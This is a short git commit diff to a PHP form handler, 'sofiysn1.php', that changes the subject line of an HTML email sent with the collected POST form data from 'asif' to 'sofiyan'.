8e3320decfea7c5eccde2fd614fa1afa345300bb
qa8683689Rashid <qa8683689@gmail.com>
2025-07-22 20:04:52 +0500

    Update sofiysn1.php

--- sofiysn1.php
+++ sofiysn1.php
@@ -45,7 +45,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'asif';
+        $mail->Subject = 'sofiyan';
         $mail->Body = $emailBody; // Set the email body using the collected form data
         
         // Send email
